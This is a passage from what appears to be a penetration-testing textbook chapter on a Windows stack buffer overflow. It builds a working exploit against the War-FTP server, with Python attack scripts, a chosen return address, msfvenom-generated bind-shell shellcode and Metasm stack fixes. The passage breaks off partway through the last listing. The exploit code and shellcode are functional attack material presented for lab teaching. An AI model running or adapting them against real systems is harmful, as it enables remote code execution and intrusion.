higher in memory at address 00AFFDA0. EDI is at 00AFFE48. We could redirect
execution to any of these locations, but with the lower address farther up
the stack, we have a little more space for our instructions.
note Also, note that ESP does not point directly to the beginning of our Cs. Our saved
return pointer overwrite is at byte 485 in the pattern, but ESP is at 493, eight bytes
away (four bytes for the return address and four bytes of Cs).
Right-click ESP in the top right of the Immunity Debugger window,
and select Follow in Stack. The stack is shown in the bottom right of the
Immunity Debugger window. Scroll up a few lines, as shown in Figure 17-10.
Notice that the line above ESP also contains four Cs, and above that
are four Bs for the return address. This tells us that we need to start our
malicious instructions for the CPU to execute four bytes into our Cs in the
attack string (because ESP is four bytes into the Cs); otherwise, the first
four bytes of our shellcode will be missed. (This sort of scenario will come
up frequently because these four Cs are caused by a calling convention and
indicate that the function has cleaned-up arguments.)
note Calling conventions are a set of rules implemented in a compiler, describing how a
child function will receive arguments from its caller function. Some conventions will
cause the caller function to remove the arguments from the stack, while others state
that the child function must remove the arguments. The latter will cause one or more
dwords (depending on the number of arguments) to be skipped on the stack automati-
cally, as shown in Figure 17-10, as soon as the child function ends.
390 Chapter 17
Figure 17-10: ESP controlled by the attack string
Now we can just put 00AFFD48 into the return address, replace our Cs
with shellcode, and we will have a complete exploit, right? Close, but not
quite. Unfortunately, if we just hardcode the address 00AFFD48 into our
return address, the exploit may work just fine for us but not in other cases—
and we want it to work as universally as possible. As we saw in Chapter 16,
the locations of registers like ESP can change based on program factors
such as the length of provided arguments or because the stack is tied to a
thread, which means the stack address can differ the next time you attack
the application. Lucky for us, jumping to a CPU register to execute its con-
tents is denoted by the assembly language instruction JMP ESP (or another
register name, as needed). In pre-ASLR operating systems, such as our
Windows XP SP3 target, Windows DLLs were loaded into the same place
in memory every time. That means if we find a JMP ESP inside an executable
module on our Windows XP target, it should be in the same place on every
Windows XP SP3 English-language machine.
For that matter, JMP ESP is not our only option. As long as we end up with
execution pointed to ESP, we can use an equivalent instruction to JMP ESP or
even a series of instructions. For example, CALL ESP will work, or PUSH ESP fol-
lowed by RET, which sends execution to the memory address in ESP.
We can find all the occurrences of JMP ESP and the logical equivalents in
the executable modules for War-FTP with the command !mona jmp -r esp, as
shown in Figure 17-11.
A Stack-Based Buffer Overflow in Windows 391
Figure 17-11: Searching for JMP ESP with Mona
The results are written to C:\logs\war-ftpd\jmp.txt. We are presented with
84 possible JMP ESP (or equivalent) instructions. Some may contain bad
characters (as we’ll discuss later in the chapter)—which instructions should
we choose? As a rule of thumb, go for modules that belong to the applica-
tion itself and not to the operating system. If that is not possible, try rela-
tively stable modules such MSVCRT.dll because very few changes have been
made to this module in Windows patches compared with other Windows
modules (although changes are still possible based on the language of the
operating system). The JMP ESP instructions Mona found in MSVCRT.dll are
shown next.
0x77c35459 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c354b4 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c35524 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c51025 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
392 Chapter 17
Let’s use the first one: the PUSH ESP followed by a RET at 0x77C35459. As in
Chapter 16, we can set a breakpoint to pause execution when we reach our
instructions to redirect execution to ESP and make sure everything is work-
ing correctly before we replace our Cs with instructions to be executed.
Set a breakpoint at the memory address 0x77C35459 with the command bp
0x77C35459 in Immunity Debugger, as shown in Figure 17-12. (To view all cur-
rently set breakpoints, go to View4Breakpoints in Immunity Debugger.)
Figure 17-12: Breakpoints in Immunity Debugger
Now replace the four Bs in your exploit string with the location of the
redirection to ESP, as shown in Listing 17-5.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "D" * 607 u
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
A Stack-Based Buffer Overflow in Windows 393
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-5: Using a return address from an executable module
With a breakpoint prepared, let’s place our new return address at the
right location in our attack string at u and change the 611 Cs to four Cs
followed by 607 Ds to account for the four bytes of the attack string before
ESP. Once the attack string is in place, run the exploit against War-FTP,
and see if it reaches our breakpoint in Immunity Debugger, as shown in
Figure 17-13.
Figure 17-13: We reached our breakpoint.
Perfect—notice in the bottom of the Immunity Debugger window that
we hit our breakpoint.
note If you forget to take endianness into account, you might not reach your breakpoint;
instead, the program will crash with an access violation at 5954C377. Be sure to flip
the bytes around to little-endian format.
394 Chapter 17
The next command to be executed is shown in the top left of the
Immunity Debugger window in the CPU pane. Use F7 to execute one com-
mand at a time rather than have the program continue running normally.
We press F7 twice to execute the PUSH ESP and RET instructions, and, as
expected, execution is redirected to the beginning of our Ds (44 in hex),
as shown in Figure 17-14.
Figure 17-14: Redirecting execution to our attack string
getting a shell
Now we just need to put something useful in place of the Ds from the
previous section for the CPU to execute on our behalf. In Chapter 4, we
used the Metasploit tool Msfvenom to generate malicious executables. We
can also use it to create raw shellcode to put in our handwritten exploits.
For instance, we can tell our hijacked CPU to open a bind shell on TCP
port 4444 (or any other port) by using Msfvenom to generate the shellcode
for a Metasploit payload.
We need to tell Msfvenom the payload to use—in this case windows/
shell_bind_tcp, the inline Windows command shell. We also need to provide
it with the maximum size we can have for our shellcode.
A Stack-Based Buffer Overflow in Windows 395
note As you experiment with crashing War-FTP, you will notice that you can actually make
the attack string slightly bigger, but things start to act strangely around 1,150 charac-
ters. (We will see what this is all about in Chapter 18.) At 1,100 characters we are
safe, and our exploit will work as expected each time.
Our current exploit string has 607 Ds, so we have 607 bytes for our
shellcode. Finally, we need to tell Msfvenom which special characters to
avoid when creating the payload. In this case, we need to avoid the null byte
(\x00), carriage return (\x0d), line feed (\x0a), and @ (\x40).
note Finding bad characters is an advanced topic beyond the scope of this book, so just
trust me that these are the right ones for this exploit. These bad characters make
sense: The null byte terminates a string, carriage return and line feed denote
a new line, and @ will break the user@server syntax for an FTP login. For
more information on this topic, check out my blog post “Finding Bad Characters
with Immunity Debugger and Mona.py” (http://www.bulbsecurity.com/
finding-bad-characters-with-immunity-debugger-and-mona-py/).
Feed this information into Msfvenom, as shown in Listing 17-6.
root@kali:~# msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d'
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
buf =
"\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b"
Listing 17-6: Generating shellcode with Msfvenom
396 Chapter 17
Msfvenom generated our shellcode in 368 bytes, leaving us plenty of
room to spare. Replace the Ds in the exploit with the generated shellcode,
as shown in Listing 17-7.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b")
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + shellcode
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-7: Our finished exploit
When you try running the exploit, something unexpected happens.
Though we are still able to hit our breakpoint and redirect execution to our
shellcode, War-FTP crashes before we receive our bind shell on port 4444.
Something in the shellcode is causing a crash, as shown in Figure 17-15.
A Stack-Based Buffer Overflow in Windows 397
Figure 17-15: War-FTP crashes
Msfvenom’s encoded shellcode needs to first decode itself before
executing, and as part of the decoding process, it needs to find its loca-
tion in memory using a routine called getPC. A common technique for
finding the current location in memory includes using an instruction
called FSTENV, which writes a structure onto the stack, overwriting what’s
there—in our case part of the shellcode. All we need to do to fix this is
move ESP away from the shellcode, so getPC has room to work without
corrupting our shellcode. (The problem in general is that if the values in
EIP and ESP are too close together, shellcode tends to corrupt itself, either
during decoding or during execution.) This is what caused our crash in
the previous run.
We can use the Metasm utility to turn a simple assembly instruction
into shellcode that we can drop into our exploit. We need to move ESP
away from our shellcode in memory. We can do this using the assembly ADD
instruction. The syntax is ADD destination, amount. Because our stack con-
sumes lower memory addresses, let’s subtract 1,500 bytes from ESP. The
number of bytes should be large enough to avoid corruption; 1,500 bytes is
usually a safe choice.
Change directories to /usr/share/metasploit-framework/tools and start
metasm_shell.rb, as shown in Listing 17-8.
398 Chapter 17
root@kali:~# cd /usr/share/metasploit-framework/tools/
root@kali:/usr/share/metasploit-framework/tools# ./metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
metasm > sub esp, 1500u
"\x81\xec\xdc\x05\x00\x00"
metasm > add esp, -1500v
"\x81\xc4\x24\xfa\xff\xff"
Listing 17-8: Generating shellcode with Metasm
If we try sub esp, 1500 u, the resulting shellcode includes null bytes,
and, as discussed earlier, a null byte is a bad character that needs to be
avoided due to the FTP specification. Instead, enter add esp, -1500 v
(a logical equivalent) into the metasm prompt.
Now add the resulting shellcode to the exploit right before the windows/
shell_bind_tcp shellcode, as shown in Listing 17-9.
#!/usr/bin/python
import socket
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +